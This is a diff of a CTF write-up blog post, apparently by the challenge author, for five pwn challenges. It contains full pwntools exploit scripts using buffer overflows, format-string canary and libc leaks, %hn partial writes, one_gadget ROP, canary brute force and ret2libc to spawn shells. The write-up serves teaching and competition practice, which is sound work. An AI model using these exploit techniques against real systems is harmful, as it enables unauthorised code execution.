@@ -1,7 +1,7 @@
 ---
 title: C00K3D CTF - Final Crunch 2025 - PWN Challenges Writeup
 date: '2025-09-01'
-tags: ['CTF', 'PWN', 'gdb', 'Overflow', 'Libc', 'Pwntools', 'Canary', 'Format String']
+tags: ['CTF', 'PWN', 'gdb', 'Overflow', 'Libc', 'Pwntools', 'Canary', 'Format String', 'ROP' , 'One Gadget']
 draft: false
 summary: Writeups for the PWN challenges that I made for the C00K3D CTF - Final Crunch 2025 
 ---
@@ -18,4 +18,296 @@ summary: Writeups for the PWN challenges that I made for the C00K3D CTF - Final 
 
 ####    - Challenge Description
 
-![Description](/static/images/c00k3d-wu/description-nova.png)
+            - Prove your **authenticity** and get the secret document.
+
+####   - Solution / Approach:
+            - No binary was provided with this challenge but a link to a remote server.
+            - Connecting to the server with netcat gives a menu with 5 options.
+                    - 1. Access NOVA AI Core
+                    - 2. View Anomaly logs
+                    - 3. Attempt Override Protocol
+                    - 4. Run System Diagnostics
+                    - 5. Disconnect
+            - We had to select option 1 to access the NOVA AI Core.
+            - The AI core prompts for an authentication passphrase 
+            - So we just smash the input with a lot of characters and we get a buffer overflow.
+            - Then it asks for a 6 digit token 
+            - just pass the 6 digit token as 123456
+            - And we get the flag.
+
+#### - Solve
+
+![Nova Secure Terminal](/static/images/c00k3d-wu/nova-solve.png)
+
+
+## Project Firewall
+
+####    - Challenge Description
+
+            - Infilitrate through the buggy firewall to access root permissions
+
+####   - Solution / Approach:
+
+            - We were given a binary (chall) vulnerable to buffer overflow.
+            - After a little analysis we can see that it has a system("/bin/sh") call inside a function
+            - We can simply overflow the buffer and overwrite the return address to point to that function.
+            - The binary is not protected by NX, PIE or Canary so it's a straightforward exploit.
+
+#### Script
+
+```py
+from pwn import *
+elf = context.binary = ELF('./chall')
+
+io = process()
+#io = remote('localhost', 1337)
+
+pop_rdi = 0x0000000000401176
+ret = 0x0000000000401016
+system = 0x0000000000401030
+bin_sh = 0x403098
+
+payload = cyclic(40) # fill buffer
+payload += p64(ret) # Stack alignment
+payload += p64(pop_rdi) # pop out rdi
+payload += p64(bin_sh) # address of "/bin/sh" into rdi
+payload += p64(system) # call system
+
+io.sendlineafter('identity:\n', payload)
+io.interactive()
+```
+
+![Project Firewall Solve](/static/images/c00k3d-wu/project_firewall-solve.png)
+
+
+## C00K3D Kitchen
+####    - Challenge Description
+
+            - Rumor says there's a secret dish but... no one can reach it!
+
+####   - Solution / Approach:
+
+            - We were given a binary (chall) with a menu-based interface, vulnerable to buffer overflow but protected by a stack canary.
+            - Used the format string vulnerability in option 1 with %17$p to leak the stack canary.
+            - Crafted a payload: 72 bytes padding + leaked canary + fake RBP + address of chef_special().
+            - Sent the payload via option 2, triggered chef_special(), and retrieved the flag.
+
+#### - Script
+
+```py
+from pwn import *
+elf = context.binary = ELF('./chall')
+
+host = "localhost"
+port = 1337
+io = process()
+#io = remote(host, port)
+
+def menu(choice):
+    io.recvuntil(b'Choice: ')
+    io.sendline(str(choice).encode())
+    return
+
+def leak():
+    menu(1)
+    io.recvuntil(b'ingredients?\n')
+    io.sendline(b'%17$p')
+    leak = io.recvline().strip()
+    canary = int(leak, 16)
+    log.success(f'Canary: {hex(canary)}')
+    return canary
+
+def exploit(canary):
+    offset = 72 # Our Canary is present after 72 bytes
+    payload = cyclic(offset) + p64(canary) 
+    payload += b'A' * 8  # Overwrite RBP
+    payload += p64(elf.symbols.chef_special)  
+    menu(2)
+    io.sendline(payload)
+
+if __name__ == '__main__':
+    canary = leak()
+    exploit(canary)
+
+io.interactive()
+```
+
+![C00K3D Kitchen Solve](/static/images/c00k3d-wu/c00k3d-kitchen-solve.png)
+
+
+## C00K3D Kitchen II
+####    - Challenge Description
+
+            - The kitchen is now locked tighter… only the cleverest apprentice can reach the final dish.
+
+
+####   - Solution / Approach:
+
+            - We were given a binary (chall) vulnerable to format string attacks and buffer overflow but had all protections enabled
+            - Used format string leaks to extract:
+                - ELF base (%13$p)
+                - libc base (%17$p)
+                - stack address (%22$p)
+            - Calculated the return slot on the stack and overwrote the return address using a %hn partial write to point execution to our controlled chain.
+            - Built a ROP chain with a libc one_gadget, sent the payload, triggered code execution, and got the shell.
+
+#### - Script
+
+```py
+#!/usr/bin/env python3
+from pwn import *
+import re
+
+context.binary = ELF("./chall", checksec=False)
+context.log_level = "info"
+
+host = "chall.c00k3d.xyz"
+port = 49193
+#io = remote(host, port)
+io = process()
+
+def menu(choice):
+    io.sendlineafter(b"> ", str(choice).encode())
+    return
+
+def leak(fmt):
+    menu(1)
+    io.recvuntil(b'Describe what you see: ')
+    io.sendline(fmt)
+    io.recvuntil(b'Got it: ')
+    return io.recvline().strip()
+
+elf_leak = leak(b'%13$p')
+libc_leak = leak(b'%17$p')
+stack_leak = leak(b'%22$p')
+
+elf_addr = int(elf_leak.decode(), 16) - 0x14b3
+libc_base = int(libc_leak.decode(), 16) - 0x29ca8
+stack = int(stack_leak.decode(), 16)
+
+log.info(f'elf base: {hex(elf_addr)}')
+log.info(f'libc base: {hex(libc_base)}')
+log.info(f'stack leak: {hex(stack)}')
+
+
+RET_OFF = 0x131e
+STACK_ADJ = 0x130
+ONE_GADGET_OFF = 0xddf43
+
+ret_target = elf_addr + RET_OFF
+inspect_kitchen_ret = stack - STACK_ADJ 
+one_gadget = libc_base + ONE_GADGET_OFF
+
+log.info(f'target ret value: {hex(ret_target)}')
+log.info(f'inspect_kitchen_ret (stack slot): {hex(inspect_kitchen_ret)}')
+log.info(f'one_gadget: {hex(one_gadget)}')
+
+# build the %hn fmt write payload 
+low16 = ret_target & 0xffff
+fmt = f"%{low16}c%8$hn".encode()
+fmt = fmt.ljust(16, b"|")
+payload = fmt + p64(inspect_kitchen_ret)
+
+menu(1)
+io.sendlineafter(b": ", payload)
+try:
+    io.recvuntil(b'Got it: ')
+    _ = io.recvline(timeout=1)
+except EOFError:
+    pass
+
+chain = cyclic(24) + p64(one_gadget)
+io.sendline(chain)
+
+io.interactive()
+```
+
+![C00K3D Kitchen II Solve](/static/images/c00k3d-wu/c00k3d-kitchen-II-solve.png)
+
+
+## Indus Veil
+####    - Challenge Description
+
+            - The Indus system is heavily fortified. Breach its defenses to retrieve the hidden flag.
+
+####   - Solution / Approach:
+
+
+            - **What we had:** A vulnerable 32-bit chall binary with stack-canary protection, **prompt** "Enter your secret:", and a `libc.so.6` file available.
+
+            - **Canary recovery:** Brute-force the canary byte-by-byte (skip 0x00/newline where appropriate), **append** discovered bytes, then `u32` the final 4-byte canary.
+
+            - **Libc leak:** Build a **payload** -> `padding(72)` + `canary` + `saved_rbp_filler` + `puts@plt` + `main` + `puts@got` to call `puts(puts@got)` and return to `main`, read **leaked** puts to calculate `libc_base`.
+
+            - **Exploit:** Compute `system()` and "/bin/sh" addresses from `libc_base`, send **final payload** `padding` + `canary` + `saved_rbp_filler` + `system` + `ret/junk` + `binsh` to get a **shell**.
+
+
+#### - Script
+
+```py
+from pwn import *
+
+elf = context.binary = ELF("./chall")
+libc = ELF('./libc.so.6')
+context.log_level = 'critical'
+offset = 72
+canary = b'\x00'  # First Null byte
+host = "chall.c00k3d.xyz"
+port = 49190
+io = process()
+#io = remote(host, port)
+
+
+# Leaking canary byte-by-byte
+for i in range(3):
+    for guess in range(256):
+        if guess in [0x00, 0x0a]:
+            continue
+        payload = b'A' * offset + canary + p8(guess)
+        io.sendlineafter(b"Enter your secret: ", payload)
+        resp = io.recvuntil(b"next seeker.\n", timeout=1)
+        if b"stack smashing detected" not in resp:
+            canary += p8(guess)
+            print(f"[+] Found byte {i+2}: {hex(guess)}")
+            break
+
+canary = u32(canary[-4:])
+print(f"[+] Final canary: {hex(canary)}")
+
+puts_plt = elf.plt['puts'] 
+puts_got = elf.got['puts']
+main_addr = elf.symbols['main']
+
+log.info(f"puts@plt: {hex(puts_plt)}")
+log.info(f"puts@got: {hex(puts_got)}")
+log.info(f"main addr: {hex(main_addr)}")
+
+payload = b"A"*offset + pack(canary) + b"B"*12 # padding
+payload += p32(puts_plt) + p32(main_addr) + p32(puts_got) # ret2plt
+
+io.sendlineafter(b"Enter your secret: ", payload)
+
+data = io.recvuntil(b"\xf7") 
+puts_leak = u32(data[-4:])
+log.success(f"Leaked puts@libc: {hex(puts_leak)}") 
+
+libc_base = puts_leak - libc.symbols['puts'] # Calculate libc base
+system_addr = libc_base + libc.symbols['system'] # Calculate system address
+binsh_addr = libc_base + next(libc.search(b"/bin/sh")) # Calculate "/bin/sh" string address
+
+log.success(f"libc base   = {hex(libc_base)}")
+log.success(f"system      = {hex(system_addr)}")
+log.success(f"/bin/sh     = {hex(binsh_addr)}")
+
+payload = cyclic(72) + pack(canary) + b"B"*12 # padding
+payload += p32(system_addr) + b"JUNK" + p32(binsh_addr) # ret2libc
+io.sendlineafter(b"Enter your secret: ", payload) 
+
+io.interactive()
+```
+
+![Indus Veil Solve](/static/images/c00k3d-wu/Indus-veil-solve.png)
+
+---
+
+Thank you for reading! I have not made them too detailed to keep it concise, but if you have any questions or need further clarification on any part of the writeups, feel free to reach out : )
